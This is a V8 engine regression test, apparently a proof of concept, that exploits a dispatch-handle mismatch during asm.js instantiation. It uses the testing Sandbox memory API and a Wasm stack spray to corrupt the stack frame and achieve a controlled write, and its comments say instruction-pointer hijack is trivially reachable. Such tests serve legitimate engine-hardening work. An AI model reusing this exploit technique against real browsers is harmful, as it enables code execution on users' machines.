// Copyright 2025 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --sandbox-testing

if (!Sandbox) throw new Error("not in sandbox testing mode");

function optimize(func) {
    for (let i = 0; i < 10000; i++) {
        //Prevent the callsite from being optimized, otherwise inlining / OSR will mess things up
        new Function("func", "args", "for(let i = 0; i < 10; i++) func(...args);")(func, args);
    }
}

//Create a function with a high formal parameter count
//We'll end up tail calling it with an incorrect dispatch handle, which will result in too many arguments being popped from the stack
let args = new Array(16);

let args_def = "";
for (let i = 0; i < args.length; i++) {
    if (args_def) args_def += ",";
    args_def += `a${i}`;
}

eval(`function bigfunc(${args_def}) { return [${args_def}]; }`);
optimize(bigfunc);

//Prepare the asm.js function whose instantiation we'll hijack
//The __single_function__ property getter will be invoked from the InstantiateAsmJs runtime function / builtin, which will allow us to swap the dispatch handle
function asmjs() {
    "use asm";
    function f() { }
    return { f: f };
}

let done = false;
let warmup = true;
Object.defineProperty(WebAssembly.Instance.prototype, "__single_function__", {
    configurable: true,
    get: () => {
        if (warmup || done) return;
        console.log("prop getter");

        //Replace the dispatch handle of the asm.js function with the one of bigfunc
        //This means that the subsequent tail call will use bigfunc's optimized code, while at the same time using the previously loaded dispatch handle of the asm.js function for the number of arguments to pass
        //The resulting mismatch will result in too many arguments being popped at the end of bigfunc
        let heap_view = new DataView(new Sandbox.MemoryView(0, 0x100000000));
        let dispatch_handle = heap_view.getUint32(Sandbox.getAddressOf(bigfunc) + 0xc, true);
        heap_view.setUint32(Sandbox.getAddressOf(asmjs) + 0xc, dispatch_handle, true);
        done = true;

        return 1337; // - must be an SMI to trigger the tail call
    },
});

//Prepare a simple Wasm module which will spray a given 64 bit value on the stack
//We'll use this to overwrite pwn's stack frame
/*
(module
    (func $spray_cb (import "js" "spray_cb") (param i64) (param i64) <repeat 16 times in total ...>)
    (func (export "spray") (param $p i64)
        (local.get $p) (local.get $p) <repeat 16 times in total ...>
        call $spray_cb
    )
)
*/
let spray_mod = new WebAssembly.Module(new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 24, 2, 96, 16, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 0, 96, 1, 126, 0, 2, 15, 1, 2, 106, 115, 8, 115, 112, 114, 97, 121, 95, 99, 98, 0, 0, 3, 2, 1, 1, 7, 9, 1, 5, 115, 112, 114, 97, 121, 0, 1, 10, 38, 1, 36, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 16, 0, 11]));
let { spray } = new WebAssembly.Instance(spray_mod, { js: { spray_cb: () => { } } }).exports;

function pwn() {
    //Trigger the vulnerability; the result of our above shenanigans is that rsp is actually above rbp once this call returns
    asmjs();

    //Spray the stack to overwrite our own stack frame; currently this triggers a write to a controlled address, but hijacking rip / etc. is also trivially doable
    spray(0x133713371337n);
}

// - required to actually crash with a clean controlled write; otherwise we either abort or write to a non-canonical address because we corrupt the argument count
optimize(pwn);

//Trigger the exploit
console.log("GO");
warmup = false;
pwn();
console.log("huh???");
